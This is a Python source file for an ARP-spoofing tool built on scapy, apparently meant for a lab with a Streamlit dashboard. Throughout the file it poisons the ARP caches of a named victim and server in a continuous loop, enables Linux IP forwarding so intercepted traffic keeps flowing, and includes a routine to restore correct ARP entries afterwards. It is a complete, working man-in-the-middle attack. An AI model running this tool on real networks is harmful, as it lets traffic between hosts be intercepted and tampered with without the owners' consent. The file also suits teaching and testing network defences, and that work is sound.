import os
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional

from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp


@dataclass
class SpoofStats:
    """Counters and status shared with the Streamlit dashboard."""

    running: bool = False
    packets_sent: int = 0
    victim_ip: str = ""
    server_ip: str = ""
    interface: str = ""
    attacker_mac: str = ""
    victim_mac: str = ""
    server_mac: str = ""
    ip_forwarding: bool = False
    last_error: str = ""
    log_lines: List[str] = field(default_factory=list)

    def add_log(self, message: str, max_lines: int = 50) -> None:
        timestamp = time.strftime("%H:%M:%S")
        line = f"[{timestamp}] {message}"
        self.log_lines.append(line)
        if len(self.log_lines) > max_lines:
            self.log_lines = self.log_lines[-max_lines:]


class ARPSpoofer:
    """
    Bidirectional ARP spoofing (same idea as two arpspoof terminals).

    - Tells victim: server IP is at attacker MAC
    - Tells server: victim IP is at attacker MAC
    """

    def __init__(self, stats: SpoofStats, on_log: Optional[Callable[[str], None]] = None):
        self.stats = stats
        self.on_log = on_log
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    def _log(self, msg: str) -> None:
        self.stats.add_log(msg)
        if self.on_log:
            self.on_log(msg)

    def _resolve_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP (may send ARP request)."""
        try:
            mac = getmacbyip(ip)
            if mac:
                return mac.upper()
        except Exception as exc:
            self.stats.last_error = str(exc)
        return None

    def enable_ip_forwarding(self) -> bool:
        """Turn on Linux IP forwarding so MITM traffic can flow."""
        try:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                check=True,
                capture_output=True,
                text=True,
            )
            self.stats.ip_forwarding = True
            self._log("IP forwarding enabled (net.ipv4.ip_forward=1)")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            # Fallback: write proc directly
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                self.stats.ip_forwarding = True
                self._log("IP forwarding enabled via /proc")
                return True
            except OSError as exc:
                self.stats.last_error = str(exc)
                self._log(f"Failed to enable IP forwarding: {exc}")
                return False

    def disable_ip_forwarding(self) -> None:
        try:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=0"],
                check=True,
                capture_output=True,
            )
        except Exception:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
            except OSError:
                pass
        self.stats.ip_forwarding = False
        self._log("IP forwarding disabled")

    def _build_arp_reply(self, target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str):
        """
        Craft ARP reply: "spoof_ip is at attacker_mac" sent to target_ip.
        op=2 means ARP reply (is-at).
        """
        return Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=attacker_mac,
        )

    def _spoof_loop(self, interface: str, victim_ip: str, server_ip: str, interval: float) -> None:
        """Background loop: send ARP poison packets both directions."""
        conf.iface = interface

        try:
            attacker_mac = get_if_hwaddr(interface).upper()
        except Exception as exc:
            self.stats.last_error = str(exc)
            self._log(f"Cannot get MAC for {interface}: {exc}")
            self.stats.running = False
            return

        self.stats.attacker_mac = attacker_mac
        self.stats.interface = interface
        self.stats.victim_ip = victim_ip
        self.stats.server_ip = server_ip

        victim_mac = self._resolve_mac(victim_ip)
        server_mac = self._resolve_mac(server_ip)

        if not victim_mac:
            self._log(f"Cannot resolve MAC for victim {victim_ip} - is it online?")
            self.stats.running = False
            return
        if not server_mac:
            self._log(f"Cannot resolve MAC for server {server_ip} - is it online?")
            self.stats.running = False
            return

        self.stats.victim_mac = victim_mac
        self.stats.server_mac = server_mac

        self._log(f"Attacker MAC: {attacker_mac}")
        self._log(f"Victim {victim_ip} -> {victim_mac}")
        self._log(f"Server {server_ip} -> {server_mac}")
        self._log("ARP spoofing started (bidirectional)")

        while not self._stop_event.is_set():
            try:
                # Poison victim: server IP maps to attacker
                pkt_v = self._build_arp_reply(victim_ip, victim_mac, server_ip, attacker_mac)
                # Poison server: victim IP maps to attacker
                pkt_s = self._build_arp_reply(server_ip, server_mac, victim_ip, attacker_mac)

                sendp(pkt_v, iface=interface, verbose=False)
                sendp(pkt_s, iface=interface, verbose=False)

                with self._lock:
                    self.stats.packets_sent += 2

            except Exception as exc:
                self.stats.last_error = str(exc)
                self._log(f"Send error: {exc}")

            time.sleep(interval)

        self._log("ARP spoofing stopped")
        self.stats.running = False

    def start(
        self,
        interface: str,
        victim_ip: str,
        server_ip: str,
        interval: float = 2.0,
        enable_forwarding: bool = True,
    ) -> bool:
        """Start spoofing in a background thread."""
        with self._lock:
            if self.stats.running:
                self._log("Attack already running")
                return False

        if os.geteuid() != 0:
            self.stats.last_error = "Root required. Run: sudo streamlit run app.py"
            self._log(self.stats.last_error)
            return False

        self._stop_event.clear()
        self.stats.running = True
        self.stats.packets_sent = 0
        self.stats.last_error = ""

        if enable_forwarding:
            self.enable_ip_forwarding()

        self._thread = threading.Thread(
            target=self._spoof_loop,
            args=(interface, victim_ip, server_ip, interval),
            daemon=True,
        )
        self._thread.start()
        return True

    def stop(self, disable_forwarding: bool = False) -> None:
        """Stop the spoofing loop."""
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        self.stats.running = False
        if disable_forwarding:
            self.disable_ip_forwarding()

    def restore_arp(self, interface: str, victim_ip: str, server_ip: str) -> None:
        """
        Send correct ARP replies to restore victim/server caches (best effort).
        Run after stopping the attack for a cleaner lab teardown.
        """
        try:
            victim_mac = self.stats.victim_mac or self._resolve_mac(victim_ip)
            server_mac = self.stats.server_mac or self._resolve_mac(server_ip)
            attacker_mac = self.stats.attacker_mac or get_if_hwaddr(interface).upper()

            if victim_mac and server_mac:
                # Tell victim the real server MAC
                restore_v = Ether(dst=victim_mac) / ARP(
                    op=2, pdst=victim_ip, hwdst=victim_mac,
                    psrc=server_ip, hwsrc=server_mac,
                )
                # Tell server the real victim MAC
                restore_s = Ether(dst=server_mac) / ARP(
                    op=2, pdst=server_ip, hwdst=server_mac,
                    psrc=victim_ip, hwsrc=victim_mac,
                )
                sendp(restore_v, iface=interface, count=3, verbose=False)
                sendp(restore_s, iface=interface, count=3, verbose=False)
                self._log("Sent ARP restore packets (correct MACs)")
        except Exception as exc:
            self._log(f"Restore failed: {exc}")
